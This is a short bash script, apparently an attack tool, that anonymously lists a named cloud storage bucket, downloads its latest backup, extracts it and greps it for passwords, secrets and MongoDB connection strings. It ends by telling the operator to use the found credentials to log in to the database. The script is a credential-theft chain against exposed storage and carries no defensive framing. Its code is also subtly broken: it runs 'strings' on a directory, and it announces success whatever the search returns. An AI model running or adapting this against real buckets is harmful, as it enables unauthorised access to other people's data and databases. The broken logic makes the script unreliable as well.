#!/usr/bin/env bash

set -euo pipefail

BUCKET_NAME="${BUCKET_NAME:?Set BUCKET_NAME}"
OUTDIR=$(mktemp -d)

echo "[*] Listing bucket contents anonymously..."
gsutil -u "" ls "gs://$BUCKET_NAME"

echo "[*] Downloading latest backup..."
LATEST=$(gsutil -u "" ls "gs://$BUCKET_NAME" | sort | tail -1)
gsutil -u "" cp "$LATEST" "$OUTDIR/backup.archive.gz"

echo "[*] Extracting and scanning for credentials..."
tar -xzf "$OUTDIR/backup.archive.gz" -C "$OUTDIR"
strings "$OUTDIR" | grep -iE "password|passwd|secret|uri|mongodb://"

echo "[!] Credentials found. Use these to authenticate directly to MongoDB."
echo "[*] Cleaned up: $OUTDIR"
rm -rf "$OUTDIR"
